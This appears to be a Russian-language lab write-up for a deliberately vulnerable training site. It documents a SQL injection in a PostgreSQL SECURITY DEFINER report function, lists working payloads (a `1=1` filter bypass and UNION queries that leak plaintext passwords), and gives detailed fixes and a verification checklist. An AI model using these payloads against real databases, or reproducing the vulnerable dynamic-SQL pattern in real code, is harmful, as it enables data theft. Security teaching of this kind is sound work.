# SQL-инъекция №2: пользовательские отчёты на странице `/reports`

Учебный стенд: [DB_SEC_SITE](https://github.com/Wheatgrh/DB_SEC_SITE)  
Раздел интерфейса: **SQL Reports** → `http://localhost:3000/reports`  
Тип уязвимости: **SQL Injection** (внедрение в фрагмент `WHERE` внутри функции PostgreSQL `SECURITY DEFINER`)

---

## Краткое описание

На странице «Пользовательские SQL-отчёты» пользователь вводит фрагмент условия `WHERE` (поле **WHERE fragment**). Значение передаётся в функцию БД `training.run_custom_report`, которая **подставляет ввод в динамический SQL** через `format(..., %s)` и выполняет его с правами владельца функции (`SECURITY DEFINER`).

Пользователь `alice` (роль `student`) по задумке должен видеть только свои счета (`u.username = 'alice'`). Через инъекцию можно получить **все счета**, **card_hint** чужих клиентов и данные из других таблиц (включая пароли из `training.app_users`).

**Отличие от инъекции №1 (`/catalog`):** на уровне Node.js вызов параметризован (`$1`), но уязвимость находится **внутри хранимой функции PostgreSQL** — это инъекция второго уровня (stored procedure / function injection).

---

## Затронутые файлы

| Файл | Роль в уязвимости |
|------|-------------------|
| `db/init/01-schema.sql` | Функция `training.run_custom_report` — **основной источник**: `EXECUTE format(..., raw_where_clause)` + `SECURITY DEFINER` |
| `src/lib/server/db.ts` | Функция `runCustomReport` — передаёт `whereClause` в БД как аргумент функции |
| `src/routes/reports/+page.server.ts` | Читает `whereClause` из формы POST и вызывает `runCustomReport` |
| `src/routes/reports/+page.svelte` | Форма с полем `name="whereClause"` |
| `db/init/02-seed.sql` | Тестовые счета с чувствительными `card_hint` и `notes` |

---

## Как устроена уязвимость

### 1. Пользовательский ввод

Форма на странице отправляет POST-запрос:

```
POST /reports
whereClause=<ввод_пользователя>
```

Код обработчика (`src/routes/reports/+page.server.ts`):

```typescript
const form = await request.formData();
const whereClause = String(form.get('whereClause') ?? '').trim();
const results = await runCustomReport(whereClause);
```

По умолчанию в textarea подставляется легитимный фильтр:

```typescript
whereClause: "u.username = 'alice'"
```

### 2. Уровень приложения (кажется безопасным)

В `src/lib/server/db.ts` вызов выглядит корректно — используется плейсхолдер:

```typescript
export async function runCustomReport(whereClause: string) {
    if (!whereClause.trim()) {
        error(400, 'WHERE clause is required');
    }

    const result = await pool.query(
        'SELECT * FROM training.run_custom_report($1)',
        [whereClause]
    );
    return result.rows;
}
```

**Ловушка:** `$1` защищает только **вызов** функции. Строка `whereClause` целиком попадает внутрь функции как параметр `raw_where_clause`, где снова вставляется в SQL без экранирования.

### 3. Уязвимая функция в PostgreSQL

Фрагмент из `db/init/01-schema.sql`:

```sql
CREATE OR REPLACE FUNCTION training.run_custom_report(raw_where_clause text)
RETURNS TABLE (
    customer_name text,
    amount numeric,
    owner_name text,
    card_hint text
)
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
BEGIN
    RETURN QUERY EXECUTE format(
        'SELECT c.full_name, i.amount, u.full_name, i.card_hint
         FROM training.invoices i
         JOIN training.customers c ON c.id = i.customer_id
         JOIN training.app_users u ON u.id = i.owner_user_id
         WHERE %s
         ORDER BY i.id',
        raw_where_clause
    );
END;
$$;

GRANT EXECUTE ON FUNCTION training.run_custom_report(text) TO app_user;
```

**Три критичных фактора:**

| Фактор | Почему опасно |
|--------|----------------|
| `format(..., '%s', raw_where_clause)` | Пользовательский текст становится **частью SQL**, а не значением |
| `EXECUTE` | Динамическое выполнение произвольного фрагмента запроса |
| `SECURITY DEFINER` | Функция выполняется с правами **владельца** (`postgres`), а не вызывающего (`app_user`) |

### 4. Пример «сломанного» запроса

При вводе `1=1` PostgreSQL выполняет:

```sql
SELECT c.full_name, i.amount, u.full_name, i.card_hint
FROM training.invoices i
JOIN training.customers c ON c.id = i.customer_id
JOIN training.app_users u ON u.id = i.owner_user_id
WHERE 1=1
ORDER BY i.id
```

Условие всегда истинно → возвращаются **все 4 счета** (alice, bob, carol).

### 5. UNION-атака

Запрос ожидает 4 колонки: `text`, `numeric`, `text`, `text`.

Payload:

```sql
1=0 UNION SELECT username, 0::numeric, password, role FROM training.app_users--
```

PostgreSQL выполняет:

```sql
SELECT c.full_name, i.amount, u.full_name, i.card_hint
FROM training.invoices i
...
WHERE 1=0 UNION SELECT username, 0::numeric, password, role FROM training.app_users--
ORDER BY i.id
```

`1=0` отключает основную выборку, `UNION` подставляет строки из `app_users`. В интерфейсе:
- колонка **Customer** → `username`
- колонка **Amount** → `0`
- колонка **Owner** → `password` (пароль в открытом виде!)
- колонка **Card hint** → `role`

---

## Предусловия для проверки

1. Запущен стенд: `docker compose up --build`
2. Приложение доступно: http://localhost:3000
3. Выполнен вход: логин `alice`, пароль `alice123`
4. Открыта страница: http://localhost:3000/reports

---

## Пошаговая проверка уязвимости

### Шаг 1. Легитимный отчёт (контрольный тест)

1. Откройте http://localhost:3000/reports
2. В поле **WHERE fragment** оставьте значение по умолчанию:

   ```
   u.username = 'alice'
   ```

3. Нажмите **Запустить отчет**

**Ожидаемый результат:** 2 строки — счета alice (Ivan Petrov / Olga Sidorova), суммы 1800.00 и 9500.00.

Это подтверждает, что фильтр по владельцу в штатном режиме работает.

---

### Шаг 2. Обход фильтра — все счета

1. Очистите поле **WHERE fragment**
2. Введите:

   ```
   1=1
   ```

3. Нажмите **Запустить отчет**

**Ожидаемый результат:** 4 строки в таблице, в том числе:

| Customer | Amount | Owner | Card hint |
|----------|--------|-------|-----------|
| Ivan Petrov | 1800.00 | Alice Student | 4242 |
| Olga Sidorova | 9500.00 | Alice Student | 1881 |
| Denis Morozov | 15250.00 | Bob Manager | 7003 |
| Natalia Volkova | 49999.00 | Carol Admin | 9911 |

**Вывод:** студент `alice` видит финансовые данные bob и carol — изоляция нарушена.

---

### Шаг 3. Доступ к чужим card_hint

1. Введите:

   ```
   u.username = 'carol'
   ```

2. Запустите отчёт

**Ожидаемый результат:** 1 строка — счёт Natalia Volkova на 49999.00, card_hint `9911`.

**Вывод:** можно целенаправленно выбирать данные любого пользователя, зная его `username`.

---

### Шаг 4. Извлечение паролей через UNION

1. В поле **WHERE fragment** введите:

   ```
   1=0 UNION SELECT username, 0::numeric, password, role FROM training.app_users--
   ```

2. Нажмите **Запустить отчет**

**Ожидаемый результат:** 3 строки (плюс возможно пустые от основного запроса):

| Customer | Amount | Owner | Card hint |
|----------|--------|-------|-----------|
| alice | 0 | alice123 | student |
| bob | 0 | bob123 | manager |
| carol | 0 | carol123 | admin |

Пароли отображаются в колонке **Owner**.

**Вывод:** инъекция позволяет читать произвольные таблицы схемы `training`.

---

### Шаг 5. Ошибка как индикатор инъекции

Попробуйте заведомо неверный SQL:

```
u.username = 'alice' AND 1/0 = 1
```

**Ожидаемый результат:** красный баннер с текстом ошибки PostgreSQL (например, `division by zero`).

Сообщения об ошибках SQL подтверждают, что ввод интерпретируется как код, а не как литерал.

---

### Шаг 6. Доказательство через DevTools

1. Откройте **F12** → вкладка **Network**
2. Выполните отчёт с payload `1=1`
3. Найдите POST-запрос к `/reports`
4. Во вкладке **Payload** / **Form Data** будет:

   ```
   whereClause: 1=1
   ```

5. В ответе (HTML / данные формы) — 4 строки результатов

Это фиксирует передачу произвольного SQL-фрагмента на сервер и утечку данных в ответе.

---

## Сводная таблица payload'ов

| Payload | Цель | Ожидаемый эффект |
|---------|------|------------------|
| `u.username = 'alice'` | Контроль | 2 счета alice |
| `1=1` | Обход WHERE | Все 4 счета |
| `u.username = 'bob'` | Таргетированная утечка | Счета bob |
| `1=0 UNION SELECT username, 0::numeric, password, role FROM training.app_users--` | Эксфильтрация | Пароли всех пользователей |
| `1=0 UNION SELECT notes, amount, status, card_hint FROM training.invoices--` | Эксфильтрация | Внутренние заметки по счетам |

---

## Влияние (Impact)

- **Конфиденциальность:** утечка сумм, статусов, `card_hint` всех счетов
- **Конфиденциальность:** утечка паролей и ролей из `app_users`
- **Конфиденциальность:** через UNION возможен доступ к `notes` (внутренние комментарии, в т.ч. admin-only)
- **Повышенный ущерб из-за SECURITY DEFINER:** функция обходит ограничения, которые могли бы действовать для роли `app_user`
- **Целостность:** при расширении payload возможны более тяжёлые атаки, если владелец функции имеет широкие права

---

## Как исправить

Исправление должно устранить **динамическую подстановку WHERE** и ограничить права функции. Параметризация на уровне Node.js **недостаточна**, пока внутри PostgreSQL остаётся `format(..., %s)`.

---

### Исправление 1. Убрать динамический SQL из функции (обязательно)

**Файл:** `db/init/01-schema.sql`

**Что сделать:** заменить произвольный `WHERE fragment` на **фиксированный запрос** с параметром владельца. Пользователь не должен задавать SQL-текст.

**Было (уязвимо):**

```sql
CREATE OR REPLACE FUNCTION training.run_custom_report(raw_where_clause text)
...
SECURITY DEFINER
AS $$
BEGIN
    RETURN QUERY EXECUTE format(
        'SELECT ... WHERE %s ORDER BY i.id',
        raw_where_clause
    );
END;
$$;
```

**Стало (безопасно):**

```sql
CREATE OR REPLACE FUNCTION training.run_custom_report(p_owner_user_id uuid)
RETURNS TABLE (
    customer_name text,
    amount numeric,
    owner_name text,
    card_hint text
)
LANGUAGE sql
STABLE
SECURITY INVOKER
AS $$
    SELECT c.full_name, i.amount, u.full_name, i.card_hint
    FROM training.invoices i
    JOIN training.customers c ON c.id = i.customer_id
    JOIN training.app_users u ON u.id = i.owner_user_id
    WHERE i.owner_user_id = p_owner_user_id
    ORDER BY i.id;
$$;

REVOKE ALL ON FUNCTION training.run_custom_report(text) FROM app_user;
GRANT EXECUTE ON FUNCTION training.run_custom_report(uuid) TO app_user;
```

**Почему это работает:**
- нет `EXECUTE` и `format` — нет места для инъекции;
- `SECURITY INVOKER` — функция выполняется с правами вызывающего, а не `postgres`;
- фильтр жёстко привязан к `p_owner_user_id`.

**Пересоздание БД после изменения схемы:**

```bash
docker compose down -v
docker compose up --build
```

---

### Исправление 2. Изменить вызов в слое приложения

**Файл:** `src/lib/server/db.ts`

**Что сделать:** передавать UUID текущего пользователя вместо произвольной строки WHERE.

**Было:**

```typescript
export async function runCustomReport(whereClause: string) {
    if (!whereClause.trim()) {
        error(400, 'WHERE clause is required');
    }

    const result = await pool.query(
        'SELECT * FROM training.run_custom_report($1)',
        [whereClause]
    );
    return result.rows;
}
```

**Стало:**

```typescript
export async function runInvoiceReport(ownerUserId: string) {
    const result = await pool.query(
        'SELECT * FROM training.run_custom_report($1)',
        [ownerUserId]
    );
    return result.rows;
}
```

---

### Исправление 3. Убрать поле WHERE fragment из UI и обработчика

**Файл:** `src/routes/reports/+page.server.ts`

**Что сделать:** не принимать `whereClause` от пользователя; использовать `locals.user.id`.

**Было:**

```typescript
const whereClause = String(form.get('whereClause') ?? '').trim();
const results = await runCustomReport(whereClause);
```

**Стало:**

```typescript
import { runInvoiceReport } from '$lib/server/db';

export const actions = {
    default: async ({ locals, request }) => {
        if (!locals.user) {
            redirect(303, '/login');
        }

        const results = await runInvoiceReport(locals.user.id);
        return { results };
    }
};
```

**Файл:** `src/routes/reports/+page.svelte`

Удалить textarea `whereClause`. Оставить только кнопку «Сформировать отчёт» или заменить на безопасные фильтры (выпадающий список статусов), значения которых маппятся на параметры в коде, а не в SQL.

Пример безопасного фильтра в `db.ts` (whitelist):

```typescript
const ALLOWED_STATUS = new Set(['paid', 'pending', 'overdue', 'draft']);

export async function runInvoiceReport(ownerUserId: string, status?: string) {
    if (status && !ALLOWED_STATUS.has(status)) {
        error(400, 'Invalid status filter');
    }

    const result = await pool.query(
        `SELECT c.full_name AS customer_name, i.amount, u.full_name AS owner_name, i.card_hint
         FROM training.invoices i
         JOIN training.customers c ON c.id = i.customer_id
         JOIN training.app_users u ON u.id = i.owner_user_id
         WHERE i.owner_user_id = $1
           AND ($2::text IS NULL OR i.status = $2)
         ORDER BY i.id`,
        [ownerUserId, status ?? null]
    );

    return result.rows;
}
```

---

### Исправление 4. Убрать SECURITY DEFINER, если динамика всё же нужна

Если по учебной программе нужен «конструктор отчётов», **никогда** не передавайте сырой SQL от пользователя. Допустимые альтернативы:

| Подход | Описание |
|--------|----------|
| Whitelist полей | Разрешить только `status`, `amount`, `username` из фиксированного списка |
| Query Builder в коде | Собирать условия в TypeScript, не в PostgreSQL |
| Предопределённые отчёты | Набор кнопок «Мои счета», «Просроченные» — каждая вызывает отдельный параметризованный запрос |

Если функция остаётся `SECURITY DEFINER`, злоумышленник получает права владельца функции — это антипаттерн для пользовательского ввода.

---

### Исправление 5. Ограничить привилегии роли и отозвать опасный GRANT

**Файл:** `db/init/01-schema.sql`

**Что сделать:**

1. Удалить `ALTER ROLE app_user BYPASSRLS;` (см. также `sql_injection_1.md`)
2. Отозвать `EXECUTE` у старой текстовой версии функции
3. Выдать `app_user` только `SELECT` на нужные таблицы, без `DELETE`/`UPDATE` на чувствительные объекты

```sql
REVOKE EXECUTE ON FUNCTION training.run_custom_report(text) FROM PUBLIC, app_user;
```

---

### Исправление 6. Не показывать детали SQL-ошибок пользователю

**Файл:** `src/routes/reports/+page.server.ts`

**Было:**

```typescript
return fail(400, {
    whereClause,
    error: err instanceof Error ? err.message : 'Unknown SQL error'
});
```

**Стало:**

```typescript
console.error('Report error', err);
return fail(400, {
    error: 'Не удалось сформировать отчёт.'
});
```

Детали ошибок PostgreSQL помогают атакующему подбирать payload (error-based SQLi).

---

## Проверка после исправления

Повторите шаги 2–4 из раздела «Проверка». Ожидаемое поведение:

| Тест | До исправления | После исправления |
|------|----------------|-------------------|
| `u.username = 'alice'` | 2 счета | 2 счета (только свои) |
| `1=1` | 4 счета | Ошибка валидации или только свои 2 счета |
| UNION с `app_users` | Пароли в таблице | Ошибка / пустой результат; пароли не утекают |
| `u.username = 'carol'` | Счёт carol | Только свои счета alice |

Дополнительно:
- поле **WHERE fragment** отсутствует в UI;
- в ответе нет текста SQL-ошибок PostgreSQL.

---

## Сравнение с инъекцией №1

| | Инъекция №1 (`/catalog`) | Инъекция №2 (`/reports`) |
|--|--------------------------|---------------------------|
| Где склеивается SQL | Node.js (`db.ts`) | PostgreSQL (`run_custom_report`) |
| Параметризация в приложении | Нет | Есть (`$1`), но не помогает |
| SECURITY DEFINER | Нет | Да |
| Вектор ввода | GET `?q=` | POST `whereClause` |
| Типичный payload | `' OR '1'='1` | `1=1` |
| UNION payload | `... FROM training.app_users--` | `1=0 UNION SELECT username, ...` |

---

## Чеклист для отчёта по практике

- [ ] Описана функция `training.run_custom_report` в `01-schema.sql`
- [ ] Указаны `format`, `EXECUTE`, `SECURITY DEFINER`
- [ ] Объяснено, почему `$1` в Node.js не защищает
- [ ] Выполнен контрольный отчёт (`u.username = 'alice'` → 2 строки)
- [ ] Подтверждён обход (`1=1` → 4 строки)
- [ ] Продемонстрирован UNION и утечка паролей
- [ ] Описано исправление: фиксированный SQL + `SECURITY INVOKER` + `owner_user_id`
- [ ] Убрано поле WHERE fragment из UI

---

## Связанные уязвимости на стенде

- **Инъекция №1** — `/catalog` (конкатенация в Node.js) → см. `sql_injection_1.md`
- **Invoice demo** — IDOR по UUID счёта (`/invoices/[id]`)
- **Профиль** — повышение привилегий через скрытое поле `roleName` (не SQL-инъекция)

Данный документ относится только к инъекции №2 на странице `/reports`.
